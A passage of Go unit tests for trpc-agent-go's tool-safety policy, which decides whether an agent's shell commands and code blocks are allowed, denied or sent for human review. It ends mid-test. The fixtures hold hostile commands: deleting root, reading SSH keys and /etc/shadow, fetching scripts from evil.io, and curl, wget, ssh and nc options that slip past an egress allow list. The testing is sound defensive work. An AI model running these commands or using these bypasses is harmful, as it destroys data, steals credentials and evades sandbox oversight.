//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"path/filepath"
	"strings"
	"testing"
)

// Synthetic secrets are assembled at runtime so no PAT-shaped or auth-header
// literal sits in source for repository secret scanners to flag, while still
// matching the shipped secret patterns.
func fakeGitHubPAT() string   { return "ghp_" + strings.Repeat("a", 36) }             // ghp_[0-9A-Za-z]{36}
func fakeAWSKey() string      { return "AKIA" + strings.Repeat("A", 16) }             // AKIA[0-9A-Z]{16}
func fakeBearerToken() string { return "Bearer " + "tkn-" + strings.Repeat("x", 16) } // bearer\s+...

// loadExamplePolicy loads the shipped example policy for rule tests.
func loadExamplePolicy(t *testing.T) *Policy {
	t.Helper()
	p, err := LoadPolicy(filepath.Join("testdata", "tool_safety_policy.yaml"))
	if err != nil {
		t.Fatalf("LoadPolicy: %v", err)
	}
	return p
}

// scanCmd is a convenience for scanning a workspace command string.
func scanCmd(t *testing.T, p *Policy, backend, command string) ([]Finding, Decision) {
	t.Helper()
	findings, decision, _ := p.scan(ExecRequest{Command: command}, backend)
	return findings, decision
}

func hasRule(findings []Finding, ruleID string) bool {
	for _, f := range findings {
		if f.RuleID == ruleID {
			return true
		}
	}
	return false
}

func TestRulesDecisionMatrix(t *testing.T) {
	p := loadExamplePolicy(t)
	cases := []struct {
		name     string
		backend  string
		req      ExecRequest
		decision Decision
		wantRule string // expected rule id (empty = no specific assertion)
	}{
		{"safe go test", BackendWorkspace, ExecRequest{Command: "go test ./..."}, DecisionAllow, ""},
		{"rm -rf root", BackendWorkspace, ExecRequest{Command: "rm -rf /"}, DecisionDeny, ruleDangerousID},
		{"read ssh key", BackendWorkspace, ExecRequest{Command: "cat ~/.ssh/id_rsa"}, DecisionDeny, ruleCredID},
		{"curl non-whitelist", BackendWorkspace, ExecRequest{Command: "curl http://evil.io/x.sh"}, DecisionDeny, ruleNetworkID},
		{"curl whitelist", BackendWorkspace, ExecRequest{Command: "curl https://github.com/a/b"}, DecisionAllow, ""},
		{"bash wrapper", BackendWorkspace, ExecRequest{Command: `bash -c "curl http://evil.io"`}, DecisionDeny, ruleShellID},
		{"legit pipe", BackendWorkspace, ExecRequest{Command: "cat a.txt | grep x"}, DecisionAllow, ""},
		{"pip install", BackendWorkspace, ExecRequest{Command: "pip install requests"}, DecisionReview, ruleDepID},
		{"long sleep", BackendWorkspace, ExecRequest{Command: "sleep 600"}, DecisionReview, ruleResourceID},
		{"unbounded yes", BackendWorkspace, ExecRequest{Command: "yes"}, DecisionDeny, ruleResourceID},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings, decision, _ := p.scan(tc.req, tc.backend)
			if decision != tc.decision {
				t.Errorf("decision = %q, want %q (findings: %+v)", decision, tc.decision, findings)
			}
			if tc.wantRule != "" && !hasRule(findings, tc.wantRule) {
				t.Errorf("missing rule %q in findings: %+v", tc.wantRule, findings)
			}
		})
	}
}

// TestCommandPolicyVsShellBypass pins the taxonomy split: a plain command that
// is merely not in the allow list is an allow-list miss (R-CMD-001), while a
// shell wrapper that can bypass the allow/deny list is a shell bypass
// (R-SHELL-001). Both deny, but they must not share a rule id.
func TestCommandPolicyVsShellBypass(t *testing.T) {
	p := loadExamplePolicy(t)

	// "rm" is not in commands.allowed and is not a wrapper -> R-CMD-001.
	findings, decision := scanCmd(t, p, BackendWorkspace, "rm -rf /")
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny", decision)
	}
	if !hasRule(findings, ruleCmdID) {
		t.Errorf("plain allow-list miss should be R-CMD-001: %+v", findings)
	}
	if hasRule(findings, ruleShellID) {
		t.Errorf("allow-list miss must not be tagged R-SHELL-001: %+v", findings)
	}
	if !hasRule(findings, ruleDangerousID) {
		t.Errorf("rm -rf / must still trip R-DEL-001 (defense in depth): %+v", findings)
	}

	// "bash -c ..." is a re-executing wrapper -> R-SHELL-001, not R-CMD-001.
	findings, decision = scanCmd(t, p, BackendWorkspace, `bash -c "curl http://evil.io"`)
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny", decision)
	}
	if !hasRule(findings, ruleShellID) {
		t.Errorf("shell wrapper should be R-SHELL-001: %+v", findings)
	}
	if hasRule(findings, ruleCmdID) {
		t.Errorf("shell wrapper must not be tagged R-CMD-001: %+v", findings)
	}
}

func TestRuleHostBackgroundPTY(t *testing.T) {
	p := loadExamplePolicy(t)
	req := ExecRequest{Command: "sleep 5", Background: true, PTY: true}
	findings, decision, _ := p.scan(req, BackendHost)
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny", decision)
	}
	if !hasRule(findings, ruleHostID) {
		t.Errorf("missing R-HOST-001: %+v", findings)
	}
}

func TestRuleHostSudo(t *testing.T) {
	p := loadExamplePolicy(t)
	findings, decision, _ := p.scan(ExecRequest{Command: "sudo rm file"}, BackendHost)
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny", decision)
	}
	if !hasRule(findings, ruleHostID) {
		t.Errorf("missing R-HOST-001 for sudo: %+v", findings)
	}
}

func TestRuleSecretInCommand(t *testing.T) {
	p := loadExamplePolicy(t)
	cmd := `curl -H "Authorization: ` + fakeBearerToken() + `" https://github.com/x`
	findings, decision, _ := p.scan(ExecRequest{Command: cmd}, BackendWorkspace)
	if !hasRule(findings, ruleSecretID) {
		t.Errorf("missing R-SECRET-001: %+v", findings)
	}
	if decision != DecisionReview {
		t.Errorf("decision = %q, want needs_human_review", decision)
	}
}

func TestRuleSecretInUnparsableCommand(t *testing.T) {
	// $VAR makes shellsafe reject the command; the secret rule must still run
	// on the raw command string so a secret is not a blind spot.
	p := loadExamplePolicy(t)
	cmd := "echo $TOKEN " + fakeAWSKey()
	findings, _, _ := p.scan(ExecRequest{Command: cmd}, BackendWorkspace)
	if !hasRule(findings, ruleShellID) {
		t.Errorf("expected shell-bypass finding for $VAR: %+v", findings)
	}
	if !hasRule(findings, ruleSecretID) {
		t.Errorf("secret rule must still fire on unparsable command: %+v", findings)
	}
}

func TestRuleEnvKeyWhitelist(t *testing.T) {
	p := loadExamplePolicy(t) // allowed_keys: PATH, HOME, LANG, GOFLAGS, GOPROXY
	// A non-whitelisted key is flagged.
	req := ExecRequest{Command: "go test ./...", Env: map[string]string{"INJECTED": "x"}}
	findings, decision, _ := p.scan(req, BackendWorkspace)
	if !hasRule(findings, ruleEnvID) {
		t.Errorf("missing R-ENV-001 for non-whitelisted key: %+v", findings)
	}
	if decision != DecisionReview {
		t.Errorf("decision = %q, want needs_human_review", decision)
	}
	// A whitelisted key is not flagged.
	ok := ExecRequest{Command: "go test ./...", Env: map[string]string{"PATH": "/usr/bin"}}
	findings, decision, _ = p.scan(ok, BackendWorkspace)
	if hasRule(findings, ruleEnvID) {
		t.Errorf("whitelisted key should not be flagged: %+v", findings)
	}
	if decision != DecisionAllow {
		t.Errorf("decision = %q, want allow", decision)
	}
}

func TestRuleEnvKeyOptIn(t *testing.T) {
	// With no allowed_keys configured the rule is inert.
	p := DefaultPolicy()
	if err := p.compile(); err != nil {
		t.Fatalf("compile: %v", err)
	}
	req := ExecRequest{Command: "ls", Env: map[string]string{"ANYTHING": "x"}}
	findings, _, _ := p.scan(req, BackendWorkspace)
	if hasRule(findings, ruleEnvID) {
		t.Errorf("R-ENV-001 should be inert without allowed_keys: %+v", findings)
	}
}

func TestRuleSecretInEnv(t *testing.T) {
	p := loadExamplePolicy(t)
	req := ExecRequest{
		Command: "go test ./...",
		Env:     map[string]string{"API_TOKEN": fakeGitHubPAT()},
	}
	findings, _, _ := p.scan(req, BackendWorkspace)
	if !hasRule(findings, ruleSecretID) {
		t.Errorf("missing R-SECRET-001 for env value: %+v", findings)
	}
}

func TestRuleDependencyWithLeadingFlags(t *testing.T) {
	p := loadExamplePolicy(t)
	findings, _ := scanCmd(t, p, BackendWorkspace, "pip install -U requests")
	if !hasRule(findings, ruleDepID) {
		t.Errorf("missing R-DEP-001 with leading flag: %+v", findings)
	}
	// A leading option that consumes a value must not hide the subcommand:
	// "go -C /tmp install pkg" is a valid spelling of "go install".
	findings, _ = scanCmd(t, p, BackendWorkspace, "go -C /tmp install example.com/pkg@v1")
	if !hasRule(findings, ruleDepID) {
		t.Errorf("missing R-DEP-001 for option-value form (go -C dir install): %+v", findings)
	}
}

func TestUnparsableFailsClosed(t *testing.T) {
	p := loadExamplePolicy(t) // unparsable_action: deny
	findings, decision := scanCmd(t, p, BackendWorkspace, "echo $(whoami)")
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny for command substitution", decision)
	}
	if !hasRule(findings, ruleShellID) {
		t.Errorf("missing R-SHELL-001: %+v", findings)
	}
}

func TestUnparsableAskWhenConfigured(t *testing.T) {
	p := loadExamplePolicy(t)
	p.UnparsableAction = ActionAsk // simulate a more permissive policy
	_, decision := scanCmd(t, p, BackendWorkspace, "echo `whoami`")
	if decision != DecisionReview {
		t.Errorf("decision = %q, want needs_human_review", decision)
	}
}

// TestExplicitAllowOverrideBeatsDenyDefault pins the fix for a finding that is
// relaxed to allow under a deny-by-default policy. "pip install requests" fires
// only R-DEP-001; overriding that rule to allow must win, not silently fall back
// to default_action: deny.
func TestExplicitAllowOverrideBeatsDenyDefault(t *testing.T) {
	p := loadExamplePolicy(t)
	p.DefaultAction = ActionDeny // deny-by-default posture
	p.RuleOverrides = map[string]Override{ruleDepID: {Action: ActionAllow}}
	findings, decision := scanCmd(t, p, BackendWorkspace, "pip install requests")
	if !hasRule(findings, ruleDepID) {
		t.Fatalf("expected R-DEP-001 to fire: %+v", findings)
	}
	if decision != DecisionAllow {
		t.Errorf("decision = %q, want allow (explicit allow override lost to deny default)", decision)
	}
}

func TestRecursiveForceFlags(t *testing.T) {
	both := [][]string{
		{"-rf", "/"}, {"-fr", "x"}, {"-Rf", "x"}, {"-r", "-f", "x"},
		{"--recursive", "--force", "x"}, {"-r", "--force", "x"},
	}
	for _, args := range both {
		if r, f := recursiveForceFlags(args); !r || !f {
			t.Errorf("recursiveForceFlags(%v) = (%v, %v), want (true, true)", args, r, f)
		}
	}
	notBoth := [][]string{{"-r", "x"}, {"-f", "x"}, {"file"}, {"-v", "x"}}
	for _, args := range notBoth {
		if r, f := recursiveForceFlags(args); r && f {
			t.Errorf("recursiveForceFlags(%v) = (true, true), want at most one", args)
		}
	}
}

// TestCurlConnectionRedirectBypass covers curl options that redirect the
// connection to a host different from the request URL. The real destination must
// be extracted so it cannot ride a whitelisted request host past the whitelist.
func TestCurlConnectionRedirectBypass(t *testing.T) {
	p := loadExamplePolicy(t) // allows github.com; on_non_whitelisted: deny
	cases := []struct {
		name string
		cmd  string
	}{
		{"connect-to space form", `curl --connect-to github.com:443:evil.io:443 https://github.com/a`},
		{"connect-to equals form", `curl --connect-to=github.com:443:evil.io:443 https://github.com/a`},
		{"connect-to match-any host1", `curl --connect-to :443:evil.io:443 https://github.com/a`},
		{"resolve pins to ip", `curl --resolve github.com:443:1.2.3.4 https://github.com/a`},
		{"resolve equals form", `curl --resolve=github.com:443:5.6.7.8 https://github.com/a`},
		{"proxy host", `curl -x http://evil.io:3128 https://github.com/a`},
		{"proxy equals form", `curl --proxy=socks5://attacker.test:1080 https://github.com/a`},
		{"proxy no scheme", `curl -x evil.io:3128 https://github.com/a`},
		{"proxy bundled short flag", `curl -sx http://evil.io:3128 https://github.com/a`},
		{"proxy inline short flag", `curl -xevil.io:3128 https://github.com/a`},
		{"url out of band equals", `curl --url=evil.io`},
		{"url out of band space", `curl --url evil.io`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings, decision := scanCmd(t, p, BackendWorkspace, tc.cmd)
			if decision != DecisionDeny {
				t.Errorf("decision = %q, want deny (findings: %+v)", decision, findings)
			}
			if !hasRule(findings, ruleNetworkID) {
				t.Errorf("missing R-NET-001 for redirect bypass: %+v", findings)
			}
		})
	}

	// A --connect-to whose real target is itself whitelisted must still allow.
	findings, decision := scanCmd(t, p, BackendWorkspace,
		`curl --connect-to github.com:443:github.com:443 https://github.com/a`)
	if decision != DecisionAllow {
		t.Errorf("whitelisted connect-to should allow, got %q: %+v", decision, findings)
	}
}

// TestCurlOpaqueConfigFailsClosed covers -K/--config: the file can define url,
// proxy and resolve directives the guard cannot read, so its presence must
// fail closed regardless of the whitelist.
func TestCurlOpaqueConfigFailsClosed(t *testing.T) {
	p := loadExamplePolicy(t)
	for _, cmd := range []string{
		`curl -K /tmp/opaque.conf https://github.com/a`,
		`curl --config /tmp/opaque.conf https://github.com/a`,
		`curl --config=/tmp/opaque.conf https://github.com/a`,
		`curl -sK /tmp/opaque.conf https://github.com/a`, // -K bundled with -s
	} {
		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
		if decision != DecisionDeny {
			t.Errorf("opaque config must fail closed for %q, got %q: %+v", cmd, decision, findings)
		}
		if !hasRule(findings, ruleNetworkID) {
			t.Errorf("missing R-NET-001 for opaque config %q: %+v", cmd, findings)
		}
	}
}

// TestCurlSafeFlagsAllow guards against over-blocking: common curl flag usage
// against a whitelisted host must still be allowed after the option-parsing
// hardening.
func TestCurlSafeFlagsAllow(t *testing.T) {
	p := loadExamplePolicy(t)
	for _, cmd := range []string{
		`curl https://github.com/org/repo`,
		`curl -sSL -o out.txt https://github.com/org/repo`,
		`curl -H "Accept: application/json" https://github.com/a`,
		`curl --output out.txt --user-agent bot https://github.com/a`,
		`curl --url https://github.com/a`,
		`curl --connect-to github.com:443:github.com:443 https://github.com/a`,
	} {
		_, decision := scanCmd(t, p, BackendWorkspace, cmd)
		if decision != DecisionAllow {
			t.Errorf("safe curl usage should allow, got %q for %q", decision, cmd)
		}
	}
}

func TestHostsFromColonSpec(t *testing.T) {
	got := hostsFromColonSpec("github.com:443:evil.io:443")
	if len(got) != 2 || got[0] != "github.com" || got[1] != "evil.io" {
		t.Errorf("connect-to spec hosts = %v, want [github.com evil.io]", got)
	}
	got = hostsFromColonSpec("github.com:443:1.2.3.4")
	if len(got) != 2 || got[1] != "1.2.3.4" {
		t.Errorf("resolve spec hosts = %v, want github.com + 1.2.3.4", got)
	}
	got = hostsFromColonSpec("example.com:443:[2001:db8::1]")
	if len(got) != 2 || got[0] != "2001:db8::1" || got[1] != "example.com" {
		t.Errorf("bracketed IPv6 hosts = %v, want [2001:db8::1 example.com]", got)
	}
	// Host-bearing specs accept single-label hostnames; pure numbers stay ports.
	got = hostsFromColonSpec("relay:8080")
	if len(got) != 1 || got[0] != "relay" {
		t.Errorf("single-label proxy hosts = %v, want [relay]", got)
	}
}

// TestCurlResolveUnbracketedIPv6Deny covers --resolve rewrites whose target is
// an unbracketed IPv6 literal or a "+"-prefixed host. curl keeps everything
// after the second colon as the address list, so the address must be extracted
// whole; the generic colon splitter would shatter it and leak the rewrite past
// the whitelist.
func TestCurlResolveUnbracketedIPv6Deny(t *testing.T) {
	p := loadExamplePolicy(t) // allows github.com; on_non_whitelisted: deny
	for _, cmd := range []string{
		`curl --resolve github.com:443:2001:db8::1 https://github.com/a`,
		`curl --resolve github.com:443:fe80::1 https://github.com/a`,
		`curl --resolve=github.com:443:2001:db8::1 https://github.com/a`,
		`curl --resolve +github.com:443:2001:db8::1 https://github.com/a`,
		`curl --resolve github.com:443:+example.com https://github.com/a`,
		// Multiple addresses: an evil address alongside a benign one still trips.
		`curl --resolve github.com:443:1.1.1.1,2001:db8::99 https://github.com/a`,
	} {
		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
		if decision != DecisionDeny {
			t.Errorf("resolve rewrite must deny for %q, got %q: %+v", cmd, decision, findings)
		}
		if !hasRule(findings, ruleNetworkID) {
			t.Errorf("missing R-NET-001 for %q: %+v", cmd, findings)
		}
	}
}

// TestHostsFromResolveSpec unit-checks the --resolve address-tail parser.
func TestHostsFromResolveSpec(t *testing.T) {
	cases := []struct {
		spec string
		want []string
	}{
		{"github.com:443:2001:db8::1", []string{"github.com", "2001:db8::1"}},
		{"github.com:443:[2001:db8::1]", []string{"github.com", "2001:db8::1"}},
		{"+github.com:443:1.2.3.4", []string{"github.com", "1.2.3.4"}},
		{"github.com:443:1.1.1.1,2001:db8::99", []string{"github.com", "1.1.1.1", "2001:db8::99"}},
		{"github.com:443", []string{"github.com"}}, // no address list
	}
	for _, tc := range cases {
		got := hostsFromResolveSpec(tc.spec)
		if len(got) != len(tc.want) {
			t.Errorf("hostsFromResolveSpec(%q) = %v, want %v", tc.spec, got, tc.want)
			continue
		}
		for i := range got {
			if got[i] != tc.want[i] {
				t.Errorf("hostsFromResolveSpec(%q) = %v, want %v", tc.spec, got, tc.want)
				break
			}
		}
	}
}

// TestCurlImplicitCurlrcConfigurable covers the opt-in fail-closed for curl's
// implicit default config (~/.curlrc et al.). It is off by default (a plain
// whitelisted curl still allows), and when enabled it denies unless -q/--disable
// is the first option.
func TestCurlImplicitCurlrcConfigurable(t *testing.T) {
	// Default policy: knob off -> whitelisted curl still allows.
	pOff := loadExamplePolicy(t)
	if pOff.Network.CurlRequireDisabledConfig {
		t.Fatalf("curl_require_disabled_config should default to false")
	}
	if _, dec := scanCmd(t, pOff, BackendWorkspace, `curl https://github.com/a`); dec != DecisionAllow {
		t.Errorf("knob off: plain whitelisted curl should allow, got %q", dec)
	}

	// Knob on -> fail closed unless -q/--disable is first.
	pOn := loadExamplePolicy(t)
	pOn.Network.CurlRequireDisabledConfig = true
	deny := []string{
		`curl https://github.com/a`,       // no -q: implicit config active
		`curl -s https://github.com/a`,    // -s is boolean, not -q
		`curl -v -q https://github.com/a`, // -q not first: config already read
		`curl -sq https://github.com/a`,   // bundled: not the literal first option
	}
	for _, cmd := range deny {
		findings, dec := scanCmd(t, pOn, BackendWorkspace, cmd)
		if dec != DecisionDeny {
			t.Errorf("knob on: %q should deny, got %q: %+v", cmd, dec, findings)
		}
		if !hasRule(findings, ruleNetworkID) {
			t.Errorf("knob on: missing R-NET-001 for %q: %+v", cmd, findings)
		}
	}
	allow := []string{
		`curl -q https://github.com/a`,        // -q first: config disabled
		`curl --disable https://github.com/a`, // long form first
	}
	for _, cmd := range allow {
		if _, dec := scanCmd(t, pOn, BackendWorkspace, cmd); dec != DecisionAllow {
			t.Errorf("knob on: %q should allow (config disabled), got %q", cmd, dec)
		}
	}
}

func TestExtractHosts(t *testing.T) {
	hosts := extractHosts("curl", []string{"-s", "https://evil.io/p", "-o", "config.yaml"})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io] (config.yaml must not be a host)", hosts)
	}
	hosts = extractHosts("ssh", []string{"user@host.example.com"})
	if len(hosts) != 1 || hosts[0] != "host.example.com" {
		t.Errorf("hosts = %v, want [host.example.com]", hosts)
	}
	hosts = extractHosts("nc", []string{"target.io", "443"})
	if len(hosts) != 1 || hosts[0] != "target.io" {
		t.Errorf("hosts = %v, want [target.io]", hosts)
	}
	// Raw IP must not bypass the whitelist (domainLike rejects it; ParseIP accepts).
	hosts = extractHosts("ssh", []string{"1.2.3.4"})
	if len(hosts) != 1 || hosts[0] != "1.2.3.4" {
		t.Errorf("hosts = %v, want [1.2.3.4]", hosts)
	}
	// scp user@host:/path — the path must not hide the host.
	hosts = extractHosts("scp", []string{"user@evil.io:/tmp/a", "."})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io]", hosts)
	}
	// scp host:/path without a user.
	hosts = extractHosts("scp", []string{"evil.io:/tmp/a"})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io]", hosts)
	}
	// Bare host to curl (no scheme) must still be parsed as a host.
	hosts = extractHosts("curl", []string{"evil.io"})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io] (bare curl host)", hosts)
	}
	// Boolean flags before a bare host must not swallow the host: -sSL/-v take
	// no value, so evil.io is still the host.
	hosts = extractHosts("curl", []string{"-sSL", "evil.io"})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io] (curl -sSL evil.io)", hosts)
	}
	// A value-taking option consumes its operand: -o config.yaml is a filename,
	// only the bare host that follows counts.
	hosts = extractHosts("curl", []string{"-o", "config.yaml", "evil.io"})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io] (config.yaml is -o value)", hosts)
	}
	// The --flag=value form is self-contained and consumes no operand.
	hosts = extractHosts("curl", []string{"--output=config.yaml", "evil.io"})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io] (--output=config.yaml)", hosts)
	}
	// wget bare host.
	hosts = extractHosts("wget", []string{"-q", "evil.io"})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io] (wget -q evil.io)", hosts)
	}
}

// TestExtractGenericHostBearingOptions pins that host-bearing options of the
// non-curl download commands (ssh/scp -J jump hosts, ssh -W/-L/-R forwarding
// specs, nc -x proxy) contribute their real targets, across space, inline and
// bundled short-flag forms, and that value-taking options consume their
// operand so it is not mistaken for a host.
func TestExtractGenericHostBearingOptions(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
		want []string
	}{
		{"ssh jump space", "ssh", []string{"-J", "evil.io", "github.com"}, []string{"evil.io", "github.com"}},
		{"ssh jump inline", "ssh", []string{"-Jevil.io", "github.com"}, []string{"evil.io", "github.com"}},
		{"ssh jump bundled", "ssh", []string{"-vJ", "evil.io", "github.com"}, []string{"evil.io", "github.com"}},
		{"ssh jump hop list", "ssh", []string{"-J", "user@evil.io:2222,relay.example:22", "github.com"},
			[]string{"evil.io", "relay.example", "github.com"}},
		{"ssh remote forward", "ssh", []string{"-R", "8080:evil.io:80", "github.com"}, []string{"evil.io", "github.com"}},
		{"ssh stdio forward", "ssh", []string{"-W", "evil.io:443", "github.com"}, []string{"evil.io", "github.com"}},
		{"nc proxy", "nc", []string{"-x", "evil.io:1080", "github.com", "443"}, []string{"evil.io", "github.com"}},
		// Raw / bracketed IPv6 operands must survive port stripping whole.
		{"nc raw ipv6", "nc", []string{"2001:db8::1", "443"}, []string{"2001:db8::1"}},
		{"ssh bracketed ipv6 port", "ssh", []string{"[2001:db8::1]:22"}, []string{"2001:db8::1"}},
		{"scp user at bracketed ipv6", "scp", []string{"user@[2001:db8::1]:/tmp/a", "."}, []string{"2001:db8::1"}},
		// Value-taking options consume their operand: key.pem / 2222 are not hosts.
		{"ssh identity file", "ssh", []string{"-i", "key.pem", "user@github.com"}, []string{"github.com"}},
		{"ssh port", "ssh", []string{"-p", "2222", "github.com"}, []string{"github.com"}},
		{"wget bundled output", "wget", []string{"-qO", "out.tar.gz", "https://github.com/a"}, []string{"github.com"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := extractHosts(tc.cmd, tc.args)
			if strings.Join(got, " ") != strings.Join(tc.want, " ") {
				t.Errorf("extractHosts(%s, %v) = %v, want %v", tc.cmd, tc.args, got, tc.want)
			}
		})
	}
}

// TestGenericDownloadOptionBypassDeny covers the non-curl equivalents of the
// curl egress-redirect/opaque-config bypasses: host-bearing options (ssh/scp
// -J, nc -x) and opaque egress controls (wget -e/--execute/--config, ssh/scp
// -o/-F, scp -S) must not ride a whitelisted request host past
// network.allowed_domains.
func TestGenericDownloadOptionBypassDeny(t *testing.T) {
	p := loadExamplePolicy(t) // allows github.com; on_non_whitelisted: deny
	cases := []struct {
		name string
		cmd  string
	}{
		{"wget execute proxy equals", `wget --execute=http_proxy=http://evil.io https://github.com/a`},
		{"wget execute proxy space", `wget --execute http_proxy=http://evil.io https://github.com/a`},
		{"wget -e short", `wget -e use_proxy=on https://github.com/a`},
		{"wget -e bundled", `wget -qe use_proxy=on https://github.com/a`},
		{"wget config equals", `wget --config=/tmp/wgetrc https://github.com/a`},
		{"wget config space", `wget --config /tmp/wgetrc https://github.com/a`},
		{"ssh -o option", `ssh -o ProxyCommand=/tmp/x github.com`},
		{"ssh -o inline", `ssh -oProxyJump=evil.io github.com`},
		{"ssh config file", `ssh -F /tmp/cfg github.com`},
		{"ssh jump host", `ssh -J evil.io github.com`},
		{"ssh jump inline", `ssh -Jevil.io github.com`},
		{"ssh jump hop list", `ssh -J user@evil.io:2222,github.com github.com`},
		{"ssh stdio forward", `ssh -W evil.io:443 github.com`},
		{"ssh remote forward", `ssh -R 8080:evil.io:80 github.com`},
		{"scp jump host", `scp -J evil.io file user@github.com:/tmp/`},
		{"scp -o option", `scp -o ProxyJump=evil.io file user@github.com:/tmp/`},
		{"scp transport program", `scp -S /tmp/fake-ssh file user@github.com:/tmp/`},
		{"nc proxy", `nc -x evil.io:1080 github.com 443`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings, decision := scanCmd(t, p, BackendWorkspace, tc.cmd)
			if decision != DecisionDeny {
				t.Errorf("decision = %q, want deny (findings: %+v)", decision, findings)
			}
			if !hasRule(findings, ruleNetworkID) {
				t.Errorf("missing R-NET-001: %+v", findings)
			}
		})
	}
}

// TestFileURIForbiddenPathDeny pins that a file: URI cannot smuggle a
// forbidden path past R-CRED-001: the URI's decoded path is matched against
// forbidden_paths, not just the raw URI string. All RFC 8089 spellings curl
// accepts are covered, including the percent-encoded form.
func TestFileURIForbiddenPathDeny(t *testing.T) {
	p := loadExamplePolicy(t)
	for _, cmd := range []string{
		`curl file:///etc/shadow`,
		`curl file:/etc/shadow`,
		`curl file://localhost/etc/shadow`,
		`curl file:///%65tc/shadow`,
		`wget file:///home/user/.ssh/id_rsa`,
	} {
		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
		if decision != DecisionDeny {
			t.Errorf("%q: decision = %q, want deny (findings: %+v)", cmd, decision, findings)
		}
		if !hasRule(findings, ruleCredID) {
			t.Errorf("%q: missing R-CRED-001: %+v", cmd, findings)
		}
	}
}

// TestRawIPv6OperandDeny pins that a raw or bracketed IPv6 operand is checked
// against the whitelist instead of being truncated at its first colon
// ("nc 2001:db8::1 443" must not slip past R-NET-001).
func TestRawIPv6OperandDeny(t *testing.T) {
	p := loadExamplePolicy(t) // allows github.com; on_non_whitelisted: deny
	for _, cmd := range []string{
		`nc 2001:db8::1 443`,
		// Unquoted [..] is already rejected by shellsafe as a glob; the quoted
		// form reaches the network rule and must still be extracted whole.
		`curl "[2001:db8::1]:8080/x"`,
		`ssh ::1`,
	} {
		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
		if decision != DecisionDeny {
			t.Errorf("%q: decision = %q, want deny (findings: %+v)", cmd, decision, findings)
		}
		if !hasRule(findings, ruleNetworkID) {
			t.Errorf("%q: missing R-NET-001: %+v", cmd, findings)
		}
	}
}

// scanCode is a convenience for scanning execute_code blocks.
func scanCode(t *testing.T, p *Policy, blocks []CodeBlock) ([]Finding, Decision) {
	t.Helper()
	var sb strings.Builder
	for _, b := range blocks {
		if sb.Len() > 0 {
			sb.WriteByte('\n')
		}
		sb.WriteString(b.Code)
	}
	findings, decision, _ := p.scan(
		ExecRequest{Command: sb.String(), CodeBlocks: blocks}, BackendCode)
	return findings, decision
}

// TestCodeBlockShellFullScan pins that a shell-language execute_code block is
// scanned like a real command: the network whitelist, dangerous-argument and
// command-policy rules all apply, so code execution is not a bypass lane.
func TestCodeBlockShellFullScan(t *testing.T) {
	p := loadExamplePolicy(t)
	cases := []struct {
		name     string
		block    CodeBlock
		wantRule string
	}{
		{"network bypass", CodeBlock{Language: "bash", Code: "curl http://evil.io/x.sh"}, ruleNetworkID},
		{"dangerous rm", CodeBlock{Language: "sh", Code: "rm -rf /"}, ruleDangerousID},
		{"credential path", CodeBlock{Language: "shell", Code: "cat ~/.ssh/id_rsa"}, ruleCredID},
		{"unlabeled treated as shell", CodeBlock{Code: "curl http://evil.io/x.sh"}, ruleNetworkID},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings, decision := scanCode(t, p, []CodeBlock{tc.block})
			if decision != DecisionDeny {
				t.Errorf("decision = %q, want deny (findings: %+v)", decision, findings)
			}
			if !hasRule(findings, tc.wantRule) {
				t.Errorf("missing %s: %+v", tc.wantRule, findings)
			}
		})
	}

	// A benign whitelisted shell block still allows.
	findings, decision := scanCode(t, p,
		[]CodeBlock{{Language: "bash", Code: "curl https://github.com/org/repo"}})
	if decision != DecisionAllow {
		t.Errorf("benign shell block should allow, got %q: %+v", decision, findings)
	}

	// An unparsable shell block fails closed via unparsable_action.
	findings, decision = scanCode(t, p,
		[]CodeBlock{{Language: "bash", Code: "curl $(cat /tmp/target)"}})
	if decision != DecisionDeny {
		t.Errorf("unparsable shell block should deny, got %q: %+v", decision, findings)
	}
	if !hasRule(findings, ruleShellID) {
		t.Errorf("missing R-SHELL-001 for unparsable block: %+v", findings)
	}
}

// TestCodeBlockBridgeAndURLs covers non-shell code: bridging into shell
// execution routes to review, and URLs embedded in the source are checked
// against the network whitelist.
func TestCodeBlockBridgeAndURLs(t *testing.T) {
	p := loadExamplePolicy(t)

	// python os.system -> review (R-SHELL-001, medium).
	findings, decision := scanCode(t, p, []CodeBlock{{
		Language: "python",
		Code:     `import os` + "\n" + `os.system("id")`,
	}})
	if decision != DecisionReview {
		t.Errorf("bridge decision = %q, want needs_human_review: %+v", decision, findings)
	}
	if !hasRule(findings, ruleShellID) {
		t.Errorf("missing R-SHELL-001 bridge finding: %+v", findings)
	}

	// A non-whitelisted URL in python code -> deny (R-NET-001).
	findings, decision = scanCode(t, p, []CodeBlock{{
		Language: "python",
		Code:     `import urllib.request` + "\n" + `urllib.request.urlopen("http://evil.io/payload")`,
	}})
	if decision != DecisionDeny {
